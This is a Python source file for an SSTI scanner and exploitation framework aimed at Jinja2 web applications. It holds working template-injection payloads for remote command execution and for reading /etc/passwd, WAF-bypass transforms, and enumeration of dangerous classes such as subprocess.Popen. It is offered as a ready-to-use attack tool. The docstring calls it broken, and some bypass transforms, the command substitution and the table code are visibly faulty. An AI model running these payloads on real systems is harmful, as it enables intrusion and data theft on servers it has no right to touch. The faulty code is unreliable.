#!/usr/bin/env python3
"""
Advanced SSTI Scanner and Exploitation Framework ..broken..
"""

import requests
import argparse
import re
from typing import List, Dict, Optional, Tuple
from urllib.parse import quote
from rich.console import Console
from rich.table import Table
from rich.progress import track

console = Console()

class SSTIScanner:
    """Advanced SSTI vulnerability scanner and exploiter"""
    
    def __init__(self, url: str, param: str = 'template'):
        self.url = url
        self.param = param
        self.session = requests.Session()
        self.vulnerable = False
        self.engine = None
        
    # Detection payloads organized by complexity
    DETECTION_STAGES = [
        {
            'name': 'Basic Math',
            'payloads': [
                '{{7*7}}',
                '{{7*\'7\'}}',
                '${{7*7}}',
            ],
            'expected': ['49', '7777777']
        },
        {
            'name': 'Object Detection',
            'payloads': [
                '{{config}}',
                '{{self}}',
                '{{request}}',
            ],
            'expected': ['Config', 'Request', 'WSGIRequest']
        },
        {
            'name': 'Class Navigation',
            'payloads': [
                '{{\'\'.__class__}}',
                '{{request.__class__}}',
                '{{config.__class__}}',
            ],
            'expected': ['<class \'str\'>', '<class', 'type']
        },
    ]
    
    # Exploitation techniques
    EXPLOITATION_METHODS = {
        'file_read': [
            '{{config.__class__.__init__.__globals__[\'os\'].popen(\'cat /etc/passwd\').read()}}',
            '{{\'\'.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[\'sys\'].modules[\'os\'].popen(\'cat /etc/passwd\').read()}}',
            '{{request.application.__globals__.__builtins__.open(\'/etc/passwd\').read()}}',
        ],
        'rce': [
            '{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}',
            '{{\'\'.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[\'sys\'].modules[\'os\'].popen(\'id\').read()}}',
            '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
            '{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\'id\').read()}}',
        ],
        'config_leak': [
            '{{config}}',
            '{{self.__dict__}}',
            '{{config.items()}}',
        ],
    }
    
    # WAF bypass variations
    BYPASS_TECHNIQUES = {
        'underscore': [
            lambda p: p.replace('_', '\\x5f'),
            lambda p: re.sub(r'__(\w+)__', lambda m: f'{{request.args.{m.group(1)}}}', p),
            lambda p: p.replace('__class__', '{{"__class__"}}'),
        ],
        'dot': [
            lambda p: p.replace('.', '[\'').replace('(', '\']'),
            lambda p: re.sub(r'\.(\w+)', r'|attr("\1")', p),
            lambda p: re.sub(r'\.(\w+)', r'["\\x\1"]', p),
        ],
        'bracket': [
            lambda p: re.sub(r'\[\'(\w+)\'\]', r'|attr("\1")', p),
            lambda p: re.sub(r'\[(\d+)\]', r'.__getitem__(\1)', p),
        ],
        'quotes': [
            lambda p: p.replace('\'', '\\x27'),
            lambda p: re.sub(r'\'(\w+)\'', r'request.args.\1', p),
        ],
    }
    
    def test_payload(
        self,
        payload: str,
        method: str = 'GET',
        expect: Optional[List[str]] = None
    ) -> Tuple[bool, str]:
        """Test a single SSTI payload"""
        try:
            if method == 'GET':
                resp = self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=10
                )
            else:
                resp = self.session.post(
                    self.url,
                    data={self.param: payload},
                    timeout=10
                )
            
            # Check for expected values
            if expect:
                for exp in expect:
                    if exp in resp.text:
                        return True, resp.text
            
            # Check for errors that indicate template processing
            error_indicators = [
                'TemplateSyntaxError',
                'UndefinedError',
                'jinja2',
                'template',
            ]
            
            for indicator in error_indicators:
                if indicator in resp.text:
                    return True, resp.text
            
            return False, resp.text
            
        except Exception as e:
            console.print(f"[red]Error testing payload:[/red] {e}")
            return False, str(e)
    
    def detect(self) -> bool:
        """Run detection stages"""
        console.print("\n[yellow]Starting SSTI Detection...[/yellow]\n")
        
        for stage in track(self.DETECTION_STAGES, description="Testing..."):
            console.print(f"\n[cyan]Stage: {stage['name']}[/cyan]")
            
            for payload in stage['payloads']:
                console.print(f"  Testing: {payload}")
                
                success, response = self.test_payload(
                    payload,
                    expect=stage.get('expected')
                )
                
                if success:
                    console.print(f"  [green]✓ Vulnerable![/green]")
                    self.vulnerable = True
                    self.engine = 'jinja2'
                    return True
                else:
                    console.print(f"  [red]✗ Not vulnerable[/red]")
        
        return False
    
    def exploit(self, technique: str = 'rce', cmd: str = 'id') -> Optional[str]:
        """Exploit detected SSTI"""
        if not self.vulnerable:
            console.print("[red]No vulnerability detected. Run detect() first.[/red]")
            return None
        
        console.print(f"\n[yellow]Exploiting with technique: {technique}[/yellow]\n")
        
        payloads = self.EXPLOITATION_METHODS.get(technique, [])
        
        for payload in payloads:
            # Customize payload with command
            if 'id' in payload and cmd != 'id':
                payload = payload.replace('id', cmd)
            
            console.print(f"Trying: {payload[:80]}...")
            
            success, response = self.test_payload(payload)
            
            if success and response:
                console.print(f"[green]Success![/green]\n")
                return response
        
        console.print("[red]All exploitation attempts failed[/red]")
        return None
    
    def bypass_waf(self, payload: str, blocked_chars: List[str]) -> List[str]:
        """Generate WAF bypass variants"""
        variants = [payload]
        
        for char_type in blocked_chars:
            if char_type in self.BYPASS_TECHNIQUES:
                new_variants = []
                for variant in variants:
                    for transform in self.BYPASS_TECHNIQUES[char_type]:
                        try:
                            new_variants.append(transform(variant))
                        except:
                            pass
                variants.extend(new_variants)
        
        return list(set(variants))  # Remove duplicates
    
    def enumerate_classes(self) -> Dict[int, str]:
        """Enumerate available classes via __subclasses__()"""
        payload = '{{\'\'.__class__.__mro__[1].__subclasses__()}}'
        success, response = self.test_payload(payload)
        
        if not success:
            return {}
        
        # Parse class list from response
        classes = {}
        matches = re.findall(r'<class \'([^\']+)\'>', response)
        
        for idx, class_name in enumerate(matches):
            classes[idx] = class_name
        
        return classes
    
    def find_useful_classes(self) -> List[Tuple[int, str]]:
        """Find potentially useful classes for exploitation"""
        classes = self.enumerate_classes()
        
        useful_patterns = [
            'subprocess.Popen',
            '_io.TextIOWrapper',
            'os._wrap_close',
            'warnings.catch_warnings',
            'pty.spawn',
        ]
        
        useful = []
        for idx, class_name in classes.items():
            for pattern in useful_patterns:
                if pattern in class_name:
                    useful.append((idx, class_name))
        
        return useful
    
    def generate_report(self) -> None:
        """Generate exploitation report"""
        table = Table(title="SSTI Scan Results")
        
        table.add_column("Property", style="cyan")
        table.add_column("Value", style="green")
        
        table.add_row("URL", self.url)
        table.add_row("Parameter", self.param)
        table.add_row("Vulnerable", "Yes" if self.vulnerable else "No")
        table.add_row("Engine", self.engine or "Unknown")
        
        console.print("\n")
        console.print(table)

def main():
    parser = argparse.ArgumentParser(
        description='Advanced SSTI Scanner and Exploitation Framework'
    )
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-p', '--param', default='template', help='Parameter name')
    parser.add_argument('-t', '--technique', default='rce', 
                       choices=['rce', 'file_read', 'config_leak'],
                       help='Exploitation technique')
    parser.add_argument('-c', '--cmd', default='id', help='Command to execute (for RCE)')
    parser.add_argument('--bypass', nargs='+', 
                       choices=['underscore', 'dot', 'bracket', 'quotes'],
                       help='WAF bypass techniques to apply')
    
    args = parser.parse_args()
    
    scanner = SSTIScanner(args.url, args.param)
    
    # Detection phase
    if scanner.detect():
        scanner.generate_report()
        
        # Exploitation phase
        result = scanner.exploit(args.technique, args.cmd)
        
        if result:
            console.print("\n[green bold]Exploitation Result:[/green bold]")
            console.print(result[:500])  # Truncate long output
            
        # Show useful classes
        console.print("\n[yellow]Finding useful classes...[/yellow]")
        useful = scanner.find_useful_classes()
        
        if useful:
            class_table = Table(title="Useful Classes")
            class_table.add_column("Index", style="cyan")
            class_table.add_column("Class Name", style="green")
            
            for idx, name in useful:
                class_table.add_column(str(idx), name)
            
            console.print(class_table)
    else:
        console.print("\n[red]No SSTI vulnerability detected[/red]")

if __name__ == "__main__":
    main()
